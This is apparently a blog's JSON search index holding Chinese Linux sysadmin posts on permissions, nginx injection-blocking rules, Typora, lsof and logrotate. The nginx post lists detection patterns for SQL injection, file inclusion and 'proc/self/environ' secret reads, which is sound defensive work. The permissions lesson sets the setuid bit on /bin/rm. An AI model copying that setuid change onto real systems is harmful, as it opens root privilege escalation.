人亦如杯子，脑子里的思想如同杯子里的水。杯子有水滋润万物浇灌大地，人脑有思想则会推动自我言行举止成就事。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"无字书","slug":"无字书","permalink":"https://garywu520.github.io/tags/%E6%97%A0%E5%AD%97%E4%B9%A6/"},{"name":"杯子取水","slug":"杯子取水","permalink":"https://garywu520.github.io/tags/%E6%9D%AF%E5%AD%90%E5%8F%96%E6%B0%B4/"}]},{"title":"老男孩37期-第7节课-系统权限","slug":"老男孩37期-第7节课-系统权限","date":"2017-06-10T01:48:54.000Z","updated":"2017-06-10T10:49:42.577Z","comments":true,"path":"2017/06/10/老男孩37期-第7节课-系统权限/","link":"","permalink":"https://garywu520.github.io/2017/06/10/%E8%80%81%E7%94%B7%E5%AD%A937%E6%9C%9F-%E7%AC%AC7%E8%8A%82%E8%AF%BE-%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90/","excerpt":"本节课上午的重点是对正则新增了awk和sed用法 下午重点是精讲了系统权限剩余部分","text":"本节课上午的重点是对正则新增了awk和sed用法 下午重点是精讲了系统权限剩余部分 sed与awk提取权限sed、awk提取文件权限12345678910111213141516171819202122232425262728##sed提取&#x2F;etc&#x2F;hosts权限[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39; |sed -r &#39;s#^.*\\(0(.*)&#x2F;-.*$#\\1#g&#39;644 sed -n &#39;4p&#39; 取第4行其中（.*）是我要提取的内容，所以需要括起来，后面使用\\1提取##awk提取&#x2F;etc&#x2F;hosts权限[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |awk &#39;NR&#x3D;&#x3D;4&#39;|awk -F &quot;[(&#x2F;]&quot; &#39;&#123;print $1&#125;&#39;Access: #以（或&#x2F;来切割，然后使用&#123;print $n&#125; 提取对应列[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |awk &#39;NR&#x3D;&#x3D;4&#39;|awk -F &quot;[(&#x2F;]&quot; &#39;&#123;print $2&#125;&#39;0644#以0或&#x2F;来切割，然后使用&#123;print $n&#125; 提取对应列[root@oldboy202 ~]# stat &#x2F;etc&#x2F;hosts |awk &#39;NR&#x3D;&#x3D;4&#39; |awk -F &quot;[0&#x2F;]&quot; &#39;&#123;print $2&#125;&#39;644awk &#39;NR&#x3D;&#x3D;4&#39; 取第4行awk -F 切割[root@oldboyedu37-nb ~]# stat -c %a &#x2F;etc&#x2F;hosts 644[root@oldboyedu37-nb ~]# stat -c%a &#x2F;etc&#x2F;hosts 644 123456789101112131415161718sed 使用-n参数来过滤出某行[root@oldboyedu37-nb ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39;Access: (0644&#x2F;-rw-r--r--) Uid: ( 0&#x2F; root) Gid: ( 0&#x2F; root)使用cut来提取并显示&#x2F;etc&#x2F;hosts权限[root@oldboyedu37-nb ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39;|cut -d &quot;(&quot; -f20644&#x2F;-rw-r--r--) Uid: cut使用-d参数以“（” 分割，提取第二列[root@oldboyedu37-nb ~]# stat &#x2F;etc&#x2F;hosts |sed -n &#39;4p&#39;|cut -d &quot;(&quot; -f2|cut -d &quot;&#x2F;&quot; -f10644再以“&#x2F;”作为分割，使用-f参数提取第1列cut 切割 -d 指定一把菜刀 -f1 取第一列 -f1,5 取第一列和第五列 -f2-6 取第2列到第6列 硬链接数-问题12345678910问：新建一个目录ett，目录下无任何内容，请问为什么硬链接数是2 ？ls -lid ett ett&#x2F;.143560 drwxr-xr-x 2 root root 4096 Jun 3 19:36 ett143560 drwxr-xr-x 2 root root 4096 Jun 3 19:36 ett&#x2F;.在上面的目录基础上，再创建一个ett&#x2F;test为什么硬链接数成了3？[root@oldboyedu37-nb oldboy]# ls -lid ett ett&#x2F;. ett&#x2F;test&#x2F;..143560 drwxr-xr-x 3 root root 4096 Jun 3 19:39 ett143560 drwxr-xr-x 3 root root 4096 Jun 3 19:39 ett&#x2F;.143560 drwxr-xr-x 3 root root 4096 Jun 3 19:39 ett&#x2F;test&#x2F;.. AWK提取IP地址123456[root@oldboy202 ~]# ifconfig eth0|awk &#39;NR&#x3D;&#x3D;2&#39;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;10.0.0.202NR&#x3D;&#x3D;2 提取第二行AWK -F 切割我们要提取IP地址，所以以空格和冒号作为切割条件，最后打印输出$4的内容 命令复习123456789查找目录下的所有文件并进行字符串替换方法一find &#x2F;oldboy -type f|xargs sed &#39;s#www.etiantian.org#www.oldboyedu.com#g&#39; 方法二sed &#39;s#www.etiantian.org#www.oldboyedu.com#g&#39; $(find &#x2F;oldboy -type f ) 方法三find &#x2F;oldboy -type f -exec sed &#39;s#www.etiantian.org#www.oldboyedu.com#g&#39; &#123;&#125; \\; 【了解】如何知道系统某些命令被修改？123给重要的文件或目录做指纹[root@oldboyedu37-nb oldboy]# md5sum &#x2F;bin&#x2F;ls8b57585ec1d53e855c4e72edc4146213 &#x2F;bin&#x2F;ls echo 命令技巧12345678910111213echo -n &quot;oldboy&quot;;echo &quot;oldboy&quot; -n参数：内容显示在1行中面试题：https:&#x2F;&#x2F;wenku.baidu.com&#x2F;view&#x2F;ebd66638b9f3f90f77c61bc6.htmlecho -e 处理特殊字符[root@oldboy202 oldboy]# echo -e &quot;oldboy\\noldboy\\toldgirl&quot;oldboyoldboy oldgirl-e 开启了转义字符的支持。\\n 换行\\t 插入tab 日期12345678date +%F 当前日期date +%F -d &quot;-1 day&quot; 显示昨天日期[root@oldboy202 ~]# date +%F -d &quot;+1 day&quot; 显示明天日期2017-05-22工作常用touch access-$(date +%F).log 创建文件加入时间tar zcf &#x2F;tmp&#x2F;etc-$(date +%F).tar.gz &#x2F;etc 压缩时给压缩包加入时间 环境变量-复习1234567如何修改PATH环境变量1. 临时修改 export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin2. 永久修改 修改&#x2F;etc&#x2F;profile 添加export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin source &#x2F;etc&#x2F;profile 文件作用123456789&#x2F;var&#x2F;log&#x2F;message 系统日志文件&#x2F;var&#x2F;log&#x2F;secure 用户登录日志（大量passwd失败记录可能意味着密码被破解）&#x2F;etc&#x2F;fstab 开机磁盘挂载配置文件&#x2F;etc&#x2F;profile 环境变量配置文件命令which 在PATH里面查找命令的全路径whereis 找到命令位置及命令相关的帮助文档find 从指定位置查找文件，例如：find &#x2F; -type f -name &quot;ls&quot; 常用命令12345678910111213141516171819202122shutdown -h now 立刻关机 ，shutdown -h 10 10分钟后立即关机，可按“Ctrl+C”键取消关机halt 立即停止系统，需要人工关闭电源（生产环境常用）reboot 重启shutdown -r 10 10分钟后立即重启chmod 修改权限（-R参数，递归修改文件权限）“Ctrl+D”组合键，退出当前用户 [作用等同于logout]“Ctrl+L” 清屏，功能等于clear&quot;Ctrl+a&quot; 把光标移到行首&quot;Ctrl+e&quot; 把光标移到行尾“Ctrl+u” 剪切光标之前的内容“Ctrl+y” 粘贴&quot;Ctrl+左方向键&quot; “Ctrl+右方向键” 命令光标左右切换“Ctrl+r” &#x2F;&#x2F;快速搜索history历史命令，然后输入命令关键字即可。 如果命令不是自己想要的，继续按“Ctrl+r” &#x2F;&#x2F;[生产环境常用] ESC + . 引用上一个命令的最后一个参数 系统权限环境创建12345678910111213groupadd incahomeuseradd oldboy -g incahome 创建用户的时候同时加入组useradd oldgirl -g incahomeuseradd testid oldboy 查看用户信息id oldgirlid test&#x2F;&#x2F;更改用户属组信息usermod -g incahome oldboy usermod -g incahome oldgirl userdel -r username 删用户的时候同时删除家目录chmod u&#x3D;rx filename 修改文件属主的权限为读执行 123456文件权限结论1：如果oldboy用户对于一个脚本只有执行（x）权限，这个脚本也无法正常运行，因为其不清楚里面脚本的具体内容。一般至少需要读（r）和执行（x）权限一起使用结论2：w可以修改文件内容（也需要r配合）文件访问过程：访问一个文件时，系统根据文件名与inode对应关系查找到block的位置，同时根据文件权限控制（文件权限是限制你是否能访问到block的关键），最后到达block存储的实体数据。这个文件实际存储在上级目录的block里面。 12345678910目录权限结论1：对于目录来说，读（r）权限需要与执行权限（x）配合，否则会出现权限错误。对目录来说，r权限就是读目录内容对目录来说，x权限表示可以进入目录，比如cd oldboydir&#x2F;。x权限也可以表示可以看到目录下面文件的属性。目录的w权限，表示可以在目录里面创建、删除、修改文件名。结论2：对于目录来说，w权限需要x权限配合，才可以在此目录下创建文件。结论3：删除或创建文件，需要上级目录具有有wx或rwx权限 删除文件原理：12硬链接数为0 ：删除文件需要看上级目录是否有w权限进程调用数为0： 通过lsof命令查找文件被哪个程序占用，然后重启服务即可取消进程占用 添加权限1chmod +x test.sh &#x3D;&#x3D;&#x3D;&#x3D;&#x3D; chmod ugo+x test.sh 网站权限-如何才能更安全123对于文件或目录来说，什么权限比较好？文件： rw-r--r-- 即，644目录： rwxr-xr-x 即，755 12345步骤1： 文件权限:644 ;目录权限：755；文件或目录的所有者都是root，一般企业中会单独创建一个普通用户（即傀儡用户），比如：www用户和www组步骤2: 与用户有关的网站子目录，文件权限644，目录权限755，属主属组改为www其他：开发人员配合，比如：限制上传压缩文件后缀、指定目录禁止PHP解析等； 默认权限控制命令umask12345678910111213141516umask能控制Linux里面创建文件或目录的默认权限[root@oldboy202 oldboy]# umask0022umask是怎么计算的？文件最大权限&#x3D;666 - umask值022&#x3D;644（文件默认权限）目录最大权限&#x3D;777 - umask值022&#x3D;755（目录默认权限）[root@oldboy202 oldboy]# umask 023 修改umask值对文件来说。如果文件权限哪一位出现基数时，文件最终权限在原权限上+1测试：umask 035 &#x2F;&#x2F;临时修改umask权限为035创建一个文件和一个目录，计算下权限值。file&#x3D;? dir&#x3D;?file&#x3D;666-035dirc&#x3D;777-035 了解特殊权限123456789101112suid作用：运行某个命令的时候，相当于是命令的所有者。[root@oldboy202 ~]# ls -l &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x. 1 root root 30768 Nov 24 2015 &#x2F;usr&#x2F;bin&#x2F;passwd[root@oldboy202 ~]# ls -l &#x2F;bin&#x2F;rm-rwxr-xr-x. 1 root root 53592 Mar 23 02:52 &#x2F;bin&#x2F;rm[root@oldboy202 ~]# chmod u+s &#x2F;bin&#x2F;rm &#x2F;&#x2F;或chmod 4755 &#x2F;bin&#x2F;rm[root@oldboy202 ~]# ls -l &#x2F;bin&#x2F;rm-rwsr-xr-x. 1 root root 53592 Mar 23 02:52 &#x2F;bin&#x2F;rmsgid作用：运行命令的时候，临时属于命令的所有者的组中。 【了解】Linux系统经典文件-passwd1234普通用户使用passwd修改密码，密码需要写入到&#x2F;etc&#x2F;shadow里面为了解决这个问题，&#x2F;usr&#x2F;bin&#x2F;passwd 文件默认具有Suid特殊权限，所以普通用户才可以像root一样自行修改密码。-rwsr-xr-x. 1 root root 30768 Nov 24 2015 &#x2F;usr&#x2F;bin&#x2F;passwd 【了解】经典目录：/tmp12345[root@oldboy202 oldboy]# ls -ld &#x2F;tmpdrwxrwxrwt. 4 root root 4096 May 22 03:29 &#x2F;tmp &#x2F;&#x2F;权限表示777,t表示黏滞位。特点：任何人都可以在&#x2F;tmp目录创建文件，但每个人只能修改、删除自己文件，即黏滞位特点chmod 1777 &#x2F;tmp 或 chmod 0+t &#x2F;tmp 文件系统权限 - chattr lsattr1234567891011121314a(append) 如果设置了这个权限，只能对文件进行追加操作。不能删除，不能修改[root@oldboy202 oldboy]# chattr +a kkk.txt &#x2F;&#x2F;修改文件只追加权限[root@oldboy202 oldboy]# lsattr kkk.txt &#x2F;&#x2F;查看文件只追加权限 [root@oldboy202 oldboy]# chattr -a garywu.txt &#x2F;&#x2F;取消文件只追加权限i(immutable 无敌) 无法修改、无法删除场景：用chattr命令防止系统中某个关键文件被修改：chattr +i &#x2F;etc&#x2F;resolv.conf测试：用mv &#x2F;etc&#x2F;resolv.conf等命令操作于该文件，都是得到Operation not permitted 的结果。vim编辑该文件时会提示W10: Warning: Changing a readonly file错误。要想修改此文件就要把i属性去掉： chattr -i &#x2F;etc&#x2F;resolv.conf 常用工具-Xshell上传下载lrzsz 1234yum install -y lrzsz &#x2F;&#x2F;安装lrzszrz 上传文件到Linuxsz 下载Linux文件到Windows","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"系统权限","slug":"系统权限","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90/"}]},{"title":"nginx中防止SQL注入规则","slug":"防止403-SQL注入漏洞","date":"2017-06-08T10:38:38.000Z","updated":"2017-06-08T10:50:39.714Z","comments":true,"path":"2017/06/08/防止403-SQL注入漏洞/","link":"","permalink":"https://garywu520.github.io/2017/06/08/%E9%98%B2%E6%AD%A2403-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"预防注入规则","text":"预防注入规则 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117vim killsql.txt## Block SQL injectionsset $block_sql_injections 0;if ($query_string ~ &quot;union.*select.*\\(&quot;) &#123;set $block_sql_injections 1;&#125;if ($query_string ~ &quot;union.*all.*select.*&quot;) &#123;set $block_sql_injections 1;&#125;if ($query_string ~ &quot;concat.*\\(&quot;) &#123;set $block_sql_injections 1;&#125;if ($block_sql_injections &#x3D; 1) &#123;return 403;&#125;## Block file injectionsset $block_file_injections 0;if ($query_string ~ &quot;[a-zA-Z0-9_]&#x3D;http:&#x2F;&#x2F;&quot;) &#123;set $block_file_injections 1;&#125;if ($query_string ~ &quot;[a-zA-Z0-9_]&#x3D;(\\.\\.&#x2F;&#x2F;?)+&quot;) &#123;set $block_file_injections 1;&#125;if ($query_string ~ &quot;[a-zA-Z0-9_]&#x3D;&#x2F;([a-z0-9_.]&#x2F;&#x2F;?)+&quot;) &#123;set $block_file_injections 1;&#125;if ($block_file_injections &#x3D; 1) &#123;return 403;&#125;## Block common exploitsset $block_common_exploits 0;#if ($query_string ~ &quot;(&lt;|&lt;).*script.*(&gt;|&gt;)&quot;) &#123;if ($query_string ~ &quot;(&lt;|%3C).*script.*(&gt;|%3E)&quot;) &#123;set $block_common_exploits 1;&#125;if ($query_string ~ &quot;GLOBALS(&#x3D;|\\[|\\%[0-9A-Z]&#123;0,2&#125;)&quot;) &#123;set $block_common_exploits 1;&#125;if ($query_string ~ &quot;_REQUEST(&#x3D;|\\[|\\%[0-9A-Z]&#123;0,2&#125;)&quot;) &#123;set $block_common_exploits 1;&#125;if ($query_string ~ &quot;proc&#x2F;self&#x2F;environ&quot;) &#123;set $block_common_exploits 1;&#125;if ($query_string ~ &quot;mosConfig_[a-zA-Z_]&#123;1,21&#125;(&#x3D;|\\&#x3D;)&quot;) &#123;set $block_common_exploits 1;&#125;if ($query_string ~ &quot;base64_(en|de)code\\(.*\\)&quot;) &#123;set $block_common_exploits 1;&#125;if ($block_common_exploits &#x3D; 1) &#123;return 403;&#125;## Block spamset $block_spam 0;if ($query_string ~ &quot;\\b(ultram|unicauca|valium|viagra|vicodin|xanax|ypxaieo)\\b&quot;) &#123;set $block_spam 1;&#125;if ($query_string ~ &quot;\\b(erections|hoodia|huronriveracres|impotence|levitra|libido)\\b&quot;) &#123;set $block_spam 1;&#125;if ($query_string ~ &quot;\\b(ambien|blue\\spill|cialis|cocaine|ejaculation|erectile)\\b&quot;) &#123;set $block_spam 1;&#125;if ($query_string ~ &quot;\\b(lipitor|phentermin|pro[sz]ac|sandyauer|tramadol|troyhamby)\\b&quot;) &#123;set $block_spam 1;&#125;if ($block_spam &#x3D; 1) &#123;return 403;&#125;## Block user agentsset $block_user_agents 0;# Don&#39;t disable wget if you need it to run cron jobs!#if ($http_user_agent ~ &quot;Wget&quot;) &#123;# set $block_user_agents 1;#&#125;# Disable Akeeba Remote Control 2.5 and earlierif ($http_user_agent ~ &quot;Indy Library&quot;) &#123;set $block_user_agents 1;&#125;# Common bandwidth hoggers and hacking tools.if ($http_user_agent ~ &quot;libwww-perl&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;GetRight&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;GetWeb!&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;Go!Zilla&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;Download Demon&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;Go-Ahead-Got-It&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;TurnitinBot&quot;) &#123;set $block_user_agents 1;&#125;if ($http_user_agent ~ &quot;GrabNet&quot;) &#123;set $block_user_agents 1;&#125;if ($block_user_agents &#x3D; 1) &#123;return 403;&#125; 应用模板1234server &#123; include &#x2F;usr&#x2F;local&#x2F;killsql.txt &#x2F;&#x2F;添加该行并重新加载nginx&#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Nginx","slug":"Nginx","permalink":"https://garywu520.github.io/tags/Nginx/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://garywu520.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"403漏洞","slug":"403漏洞","permalink":"https://garywu520.github.io/tags/403%E6%BC%8F%E6%B4%9E/"}]},{"title":"Typora For MarkDown-语法总结","slug":"Typora-For-MarkDown-语法总结","date":"2017-06-08T09:07:18.000Z","updated":"2017-06-08T09:51:37.217Z","comments":true,"path":"2017/06/08/Typora-For-MarkDown-语法总结/","link":"","permalink":"https://garywu520.github.io/2017/06/08/Typora-For-MarkDown-%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93/","excerpt":"优雅的做一个键盘侠 之前笔者一直使用破解版的markdown2，后来有幸朋友推荐Typora，决定下载试用下。令我没想到的是，我竟然被诸多功能所折服，从此也成了一个键盘侠。","text":"优雅的做一个键盘侠 之前笔者一直使用破解版的markdown2，后来有幸朋友推荐Typora，决定下载试用下。令我没想到的是，我竟然被诸多功能所折服，从此也成了一个键盘侠。 Typora 功能介绍 Typora是一个功能强大的Markdown编辑器，使用GFM风格（即大名鼎鼎的github flavored markdown），Typora目前支持Mac OS和Windows和Linux。Typora可以插入数学表达式，插入表情，表格，支持标准的Markdown语法，可以使用标注。还可以导出PDF文件和HTLM文件。实时预览！ Typora 使用 目录大纲 123456# 一级标题## 二级标题### 三级标题#### 四级标题##### 五级标题###### 六级标题 以实点（·）排序 1234&quot;-&quot;+&quot;空格&quot; 即可效果：· 插入灰色代码块区域 1​&#96;&#96;&#96; (三个反引号+回车) &#x2F;&#x2F;反引号是Esc下面的按键 插入引用 1在行首输入一个 &gt; 就可以开始引用，而且引用可以嵌套 图片拖拽 1拖拽图片即可完成上传，非常方便。 插入URL链接 123使用尖括号包裹的url将产生一个连接，例如：&lt;www.baidu.com&gt;当然，我们更希望在某个词上面加上超链接，如何搞呢？ 比如：Gary的博客 选中想要添加超链接的文字，右键选择超链接图标，然后把URL粘贴到需要超链接文字后面的括号里即可。 ​ ​ 最后附上官网，做个键盘侠，其实很简单！ 参考：Typora语法 Typora 官方网站：DownLoad","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"Typora","slug":"Typora","permalink":"https://garywu520.github.io/tags/Typora/"},{"name":"MarkDown","slug":"MarkDown","permalink":"https://garywu520.github.io/tags/MarkDown/"}]},{"title":"lsof命令-总结","slug":"lsof命令-总结","date":"2017-06-07T09:39:31.000Z","updated":"2017-06-07T10:46:20.157Z","comments":true,"path":"2017/06/07/lsof命令-总结/","link":"","permalink":"https://garywu520.github.io/2017/06/07/lsof%E5%91%BD%E4%BB%A4-%E6%80%BB%E7%BB%93/","excerpt":"lsof介绍lsof（list open files）是一个列出当前系统打开文件的工具。 在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。","text":"lsof介绍lsof（list open files）是一个列出当前系统打开文件的工具。 在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。 命令示例1. 找出谁在使用某个文件 [root@ns-2 ~]# lsof /var/log/messages COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME rsyslogd 697 root 3w REG 253,0 504163 69130584 /var/log/messages 2. 递归查找某个目录中所有打开的文件 [root@ns-2 ~]# lsof +D /usr/local/etc/unbound/ COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME unbound 28966 root cwd DIR 253,0 4096 134379613 /usr/local/etc/unbound unbound 28966 root rtd DIR 253,0 4096 134379613 /usr/local/etc/unbound unbound 28966 root 21w REG 253,0 1618157 134358803 /usr/local/etc/unbound/unbound_running.log 3. 列出某个用户打开的所有文件 [root@ns-2 ~]# lsof -u wuyanteng |more sshd 8039 wuyanteng mem REG 253,0 15480 134358778 /usr/lib64/security/pam_lastlog.so sshd 8039 wuyanteng mem REG 253,0 15624 201432150 /usr/lib64/libpam_misc.so.0.82.0 sshd 8039 wuyanteng mem REG 253,0 19600 134358779 /usr/lib64/security/pam_limits.so 4. 查看某个程序打开的所有文件 [root@ns-2 ~]# lsof -c unbound COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME unbound 28966 root cwd DIR 253,0 4096 134379613 /usr/local/etc/unbound unbound 28966 root rtd DIR 253,0 4096 134379613 /usr/local/etc/unbound unbound 28966 root txt REG 253,0 4069713 535415 /usr/local/sbin/unbound 5. 查看某个PID对应的进程打开的文件 [root@ns-2 ~]# lsof -p 766 dnscrypt- 766 root txt REG 253,0 461231 503249 /usr/local/sbin/dnscrypt-proxy dnscrypt- 766 root mem REG 253,0 62184 201328501 /usr/lib64/libnss_files-2.17.so dnscrypt- 766 root mem REG 253,0 2118128 201328482 /usr/lib64/libc-2.17.so 6. 列出所有TCP网络连接 [root@ns-2 ~]# lsof -i tcp COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME dnscrypt- 766 root 11u IPv4 17618 0t0 TCP localhost:mdns (LISTEN) sshd 941 root 3u IPv4 649 0t0 TCP *:ssh (LISTEN) sshd 941 root 4u IPv6 651 0t0 TCP *:ssh (LISTEN) dnscrypt- 943 root 11u IPv4 16020 0t0 TCP localhost:mdns (LISTEN) 7. 列出所有UDP网络连接 [root@ns-2 ~]# lsof -i udp local 7831 postfix 16u IPv4 2814062 0t0 UDP *:40209 yum 8091 root 8u IPv4 2826722 0t0 UDP bogon:47324-&gt;public1.114dns.com:domain unbound 28966 root 3u IPv4 671972 0t0 UDP bogon:domain 8. 找到使用某个端口的进程 [root@ns-2 ~]# lsof -i:10050 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME zabbix_ag 963 zabbix-agent 4u IPv4 14018 0t0 TCP *:zabbix-agent (LISTEN) zabbix_ag 969 zabbix-agent 4u IPv4 14018 0t0 TCP *:zabbix-agent (LISTEN) zabbix_ag 970 zabbix-agent 4u IPv4 14018 0t0 TCP *:zabbix-agent (LISTEN) 9. 列出ipv4所有进程 [root@ns-2 ~]# lsof -i 4 //列举出所有ipv4进程 [root@ns-2 ~]# lsof -i 6 //列举出所有ipv6进程 COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME sshd 941 root 4u IPv6 651 0t0 TCP *:ssh (LISTEN) master 1371 root 14u IPv6 9677 0t0 TCP localhost:smtp (LISTEN) unbound 28966 root 19u IPv6 671988 0t0 TCP localhost:ub-dns-control (LISTEN)","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"lsof","slug":"lsof","permalink":"https://garywu520.github.io/tags/lsof/"}]},{"title":"logrotate日志管家","slug":"logrotate日志管家","date":"2017-06-07T03:42:21.000Z","updated":"2017-07-11T02:21:51.484Z","comments":true,"path":"2017/06/07/logrotate日志管家/","link":"","permalink":"https://garywu520.github.io/2017/06/07/logrotate%E6%97%A5%E5%BF%97%E7%AE%A1%E5%AE%B6/","excerpt":"前言服务器日志是任何故障排除过程中非常重要的一部分，但这些日志会随着时间增长。在这种情况下，我们需要手动执行日志清理以回收空间，这是一件繁琐的管理任务。","text":"前言服务器日志是任何故障排除过程中非常重要的一部分，但这些日志会随着时间增长。在这种情况下，我们需要手动执行日志清理以回收空间，这是一件繁琐的管理任务。 而logrotate就是管理这些日志文件的神器，可以对单个日志文件或者某个目录下的文件按时间/大小进行切割，压缩操作；指定日志保存数量；还可以在切割之后运行自定义命令。 logrotate工作原理 在接触任何工具之前，必须了解清楚其原理，配置起来才足够优雅。​ 系统会按照计划的频率运行logrotate，通常是每天。在大多数的Linux发行版本上，计划每天运行的脚本位于 /etc/cron.daily/logrotate 当然，也有一些系统的文件位置不同，比如Gentoo，这个脚本是 /etc/cron.daily/logrotate.cron 当logrotate运行的时候，它会读取自身的配置文件来决定需要分割日志文件的路径，分割日志文件的频率及保留多少个日志存档。 显而易见，Logrotate是基于CRON来运行的，其脚本是「/etc/cron.daily/logrotate」：​ #!/bin/sh /usr/sbin/logrotate /etc/logrotate.conf EXITVALUE=$? if [ $EXITVALUE != 0 ]; then /usr/bin/logger -t logrotate &quot;ALERT exited abnormally with [$EXITVALUE]&quot; fi exit 0 logrotate安装默认主流Linux发行版上都默认安装有logrotate包，如果查看没有，可以自行安装 # logrotate -v # yum install -y logrotate crontabs 配置logrotate的主要配置文件是 /etc/logrotate.conf 这个文件包含logrotate分割日志时所使用的默认的参数。这个文件一般是被注释掉的，所以你可以粗略浏览一下看看大概的设置。 注意当中的一行： include /etc/logrotate.d /etc/logrotate.d 注：这个目录下的文件数量可能为零，也可能有很多个配置文件，这取决于你安装应用的数量。总体上说，你通过包管理软件安装的应用也会在这个目录下创建一个配置文件。 ​ logrotate选项monthly: --&gt;日志文件将按月轮循。其它可用值为‘daily’，‘weekly’或者‘yearly’ compress --&gt; 压缩日志文件的所有非当前版本 dateext --&gt; 为日志文件打上日期标签 delaycompress --&gt; 压缩所有版本，除了当前和下一个最近的 endscript --&gt; 标记 prerotate 或 postrotate 脚本的结束 errors &quot;emailid&quot; --&gt; 给指定邮箱发送错误通知 missingok --&gt; 如果日志文件丢失，不要显示错误 notifempty --&gt; 如果日志文件为空，则不轮换日志文件 olddir &quot;dir&quot; --&gt; 指定日志文件的旧版本放在 “dir” 中 postrotate --&gt; 引入一个在日志被轮换后执行的脚本 prerotate --&gt; 引入一个在日志被轮换前执行的脚本 rotate 5 --&gt; 保留多少个日志。当新的日志产生时删除最老的一个 sharedscripts --&gt; 对于整个日志组只运行一次脚本 size=&#39;logsize&#39; --&gt; 在日志大小大于 logsize（例如 100K，4M）时轮换 测试我们创建一个10MB的日志文件/var/log/log-file,然后在其中填入一个10MB的随机比特流数据。​ # touch /var/log/log-file # head -c 10M &lt; /dev/urandom &gt; /var/log/log-file # ls -lhi /var/log/log-file 现在日志文件已经准备好，我们将配置logrotate来轮循切割该日志文件。现在为该文件创建一个配置文件。 vim /etc/logrotate.d/log-file /var/log/log-file &#123; monthly dateext rotate 5 compress delaycompress missingok notifempty create 644 root root postrotate /usr/bin/killall -HUP rsyslogd endscript &#125; 参数可根据上面的释义进行调整 logrotate是通过CRON来运行的，如果你等不及可以使用以下命令进行测试。 正式执行前最好通过Debug选项来验证一下，这对调试很重要： logrotate -d -f /etc/logrotate.d/log-file 上面的命令不报错，就可以执行了 logrotate -f /etc/logrotate.d/log-file 然后我们去看看原理的log-file变化 ls -lhi /var/log/log-fi* 69130581 -rw-r--r--. 1 root root 0 Jun 7 15:35 /var/log/log-file 69130571 -rw-r--r--. 1 root root 10M Jun 7 15:05 /var/log/log-file-20170607 完工 生产环境-举例按天保存一周的Nginx日志压缩文件，配置文件为「/etc/logrotate.d/nginx」 /usr/local/nginx/logs/*.log &#123; daily dateext compress rotate 7 sharedscripts postrotate kill -USR1 `cat /var/run/nginx.pid` endscript &#125; Logrotate的疑问问题：sharedscripts的作用是什么？ 大家可能注意到了，我在前面Nginx的例子里声明日志文件的时候用了星号通配符，也就是说这里可能涉及多个日志文件，比如：access.log和error.log。说到这里大家或许就明白了，sharedscripts的作用是在所有的日志文件都轮转完毕后统一执行一次脚本。如果没有配置这条指令，那么每个日志文件轮转完毕后都会执行一次脚本。 问题：rotate和maxage的区别是什么？ 它们都是用来控制保存多少日志文件的，区别在于rotate是以个数为单位的，而maxage是以天数为单位的。如果我们是以按天来轮转日志，那么二者的差别就不大了。 问题：为什么生成日志的时间是凌晨四五点？ 前面我们说过，Logrotate是基于CRON运行的，所以这个时间是由CRON控制的，具体可以查询CRON的配置文件「/etc/crontab」，可以手动改成如23:59等时间执行 SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root HOME=/ # run-parts 01 * * * * root run-parts /etc/cron.hourly 59 23 * * * root run-parts /etc/cron.daily 22 4 * * 0 root run-parts /etc/cron.weekly 42 4 1 * * root run-parts /etc/cron.monthly 如果使用的是新版CentOS，那么配置文件为：/etc/anacrontab。 问题：如何告诉应用程序重新打开日志文件？ 